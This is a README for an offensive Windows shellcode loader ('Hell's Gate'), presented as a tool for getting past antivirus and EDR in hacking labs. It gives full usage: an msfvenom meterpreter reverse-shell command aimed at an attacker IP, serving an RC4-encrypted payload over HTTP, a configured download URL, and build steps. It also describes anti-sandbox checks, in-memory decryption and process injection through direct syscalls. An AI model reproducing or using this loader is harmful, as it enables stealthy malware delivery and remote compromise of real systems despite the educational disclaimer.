# Disclamer
**I am in no way responsible for what you do with this tool. Its purpose is to help you bypass HackTheBox & Vulnlab labs with AV&EDR.
Do not use this tool for malicious purposes. It is an educational project.**

# Loader C - Hell's Gate

C port of the NIM dropper. Downloads an RC4-encrypted payload via HTTP, decrypts it in memory, and injects it into a suspended process using direct syscalls.

## Structure

```
main.c          Orchestrator
rc4.h/.c        RC4 encryption (symmetric, in-place)
sandbox.h/.c    Anti-sandbox (RAM < 1 GB = exit)
hellsgate.h/.c  Syscall number extraction + ASM stubs
http.h/.c       WinHTTP download
inject.h/.c     Process hollowing + APC injection
encode2rc4.c    Standalone RC4 encoding tool
```

## Prerequisites

```bash
sudo apt install gcc-mingw-w64-x86-64 make
```

## Compilation

```bash
make                    # loader.exe + encode2rc4.exe (Windows)
make encode2rc4-linux   # native Linux encoder
make release            # optimized loader (-Os -s)
make clean              # clean build/
```

## Usage

### 1 - Generate a shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin
```

### 2 - Encrypt with RC4

```bash
./build/encode2rc4-linux kernel32.dll payload.bin payload.enc
```

### 3 - Serve the payload

```bash
python3 -m http.server 8080
```

### 4 - Configure and compile

Edit the constants in `main.c`:

```c
#define PAYLOAD_URL "http://10.10.14.5:8080/payload.enc"
#define RC4_KEY     "kernel32.dll"
```

```bash
make release
```

### 5 - Execute

Transfer `build/loader.exe` to the Windows target. The loader:

1. Checks RAM > 1 GB (anti-sandbox)
2. Downloads the encrypted payload
3. Decrypts RC4 in memory
4. Launches `explorer.exe` in a suspended state
5. Injects via direct syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread)
6. Resumes the thread

## RC4 round-trip test

```bash
echo "test" > /tmp/a.bin
./build/encode2rc4-linux mykey /tmp/a.bin /tmp/b.bin
./build/encode2rc4-linux mykey /tmp/b.bin /tmp/c.bin
diff /tmp/a.bin /tmp/c.bin  # no output = OK
```

## API

| Module | Function | Description |
|---|---|---|
| rc4 | `rc4_crypt(key, key_len, data, data_len)` | Encrypts/decrypts in place |
| sandbox | `sandbox_check()` | `TRUE` if RAM >= 1 GB |
| hellsgate | `get_syscall_number(func_name)` | Extracts the SSN from ntdll |
| hellsgate | `create_syscall_stub(ssn)` | 12-byte RWX stub |
| http | `http_download(url, &data, &len)` | HTTP/HTTPS download, buffer to `free()` |
| inject | `inject_shellcode(buf, len)` | Full injection (create + alloc + write + APC) |
